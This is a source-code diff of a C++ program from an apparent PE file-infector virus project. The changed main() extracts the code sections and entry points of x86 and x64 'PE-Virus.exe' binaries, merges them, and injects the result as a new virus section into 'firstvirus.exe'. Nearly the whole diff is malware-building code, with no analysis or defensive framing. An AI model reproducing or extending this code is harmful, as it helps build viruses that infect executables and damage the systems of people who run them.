@@ -1,3 +1,5 @@
+#include "viruscpp.h"
+
 #include <filesystem>
 #include <fstream>
 #include <iostream>
@@ -14,35 +16,29 @@ int main(int argc, char *argv[]) {
         path = path.substr(0, path.size() - 4);
     }
     else
+
     {
         return 0;
     }
     
-    string p32_path = path + "file\\virusexe\\x86\\PE-Virus.exe";
+	pe::PortableExecutable file_x86(path + "file\\virusexe\\x86\\PE-Virus.exe");
+	pe::PortableExecutable file_x64(path + "file\\virusexe\\x64\\PE-Virus.exe");
 
-    std::filesystem::path p32{p32_path};
+	pe::SECTION code_section_x86 = file_x86.GetCodeSectionOfEntryPoint();
+	pe::SECTION code_section_x64 = file_x64.GetCodeSectionOfEntryPoint();
+	DWORD virus_entry_point_x86 = file_x86.GetEntryPoint() - code_section_x86.header.VirtualAddress + 8;
+	DWORD virus_entry_point_x64 = file_x64.GetEntryPoint() - code_section_x64.header.VirtualAddress + 8;
+	
+    vector<unsigned char> merge(8);
 
-    vector<unsigned char> v32(std::filesystem::file_size(p32));
+	memcpy(&merge[0], &virus_entry_point_x86, sizeof(DWORD));
+	memcpy(&merge[4], &virus_entry_point_x64, sizeof(DWORD));
 
-    ifstream ifs32(p32_path, std::ios_base::binary);
-    ifs32.read((char *)&v32[0], std::filesystem::file_size(p32));
-    ifs32.close();
+    std::copy (&code_section_x86.data[0], &code_section_x86.data[code_section_x86.data.size()], std::back_inserter(merge));
+    std::copy (&code_section_x64.data[0], &code_section_x64.data[code_section_x64.data.size()], std::back_inserter(merge));
 
-    std::string p64_path = path + "file\\virusexe\\x64\\PE-Virus.exe";
-    std::filesystem::path p64{p64_path};
+	virus::PeVirus virus_file("firstvirus.exe");
 
-    vector<unsigned char> v64(std::filesystem::file_size(p64));
-
-    ifstream ifs64(p64_path, std::ios_base::binary);
-    ifs64.read((char *)&v64[0], std::filesystem::file_size(p64));
-    ifs64.close();
-
-    vector<unsigned char> merge;
-
-    std::copy (&v32[0x400], &v32[0x400 + 0x1e00], std::back_inserter(merge));
-    std::copy (&v64[0x400], &v64[0x400 + 0x2400], std::back_inserter(merge));
-
-    ofstream ofs(path + "file\\virusbody\\virus_code_section", std::ios_base::binary);
-    ofs.write((char *)&merge[0], merge.size());
-    ofs.close();
+	virus_file.AddVirusSection(merge);
+	virus_file.FlushChange();
 }
